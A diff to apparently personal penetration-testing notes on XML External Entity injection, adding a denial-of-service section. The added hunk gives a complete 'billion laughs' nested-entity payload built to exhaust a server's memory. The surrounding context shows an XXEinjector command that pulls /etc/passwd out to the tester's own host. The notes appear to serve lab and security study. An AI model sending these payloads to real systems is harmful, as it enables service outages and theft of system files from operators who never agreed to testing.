@@ -11,6 +11,7 @@
 	* [Out-of-band Data Exfiltration](#out-of-band-data-exfiltration) **(Fully blind)**
 		* Manually
 		* Automated
+* DOS
 ---
 ## Overview
 [XML External Entity (XXE) Injection](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
@@ -265,4 +266,31 @@ XXEINJECT
 ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
 ```
 * All exfiltrated files get stored in the Logs folder under the tool `cat Logs/10.129.201.94/etc/passwd.log`
+---
+# DOS
+Common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload:
+``` XML
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY a0 "DOS" >
+  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
+  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
+  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
+  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
+  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
+  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
+]>
+<root>
+<name></name>
+<tel></tel>
+<email>&a10;</email>
+<message></message>
+</root>
+```
+- This payload defines the `a0` entity as `DOS`, references it in `a1` multiple times, references `a1` in `a2`, and so on until the back-end server's memory runs out due to the self-reference loops.
+> this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference
 ---
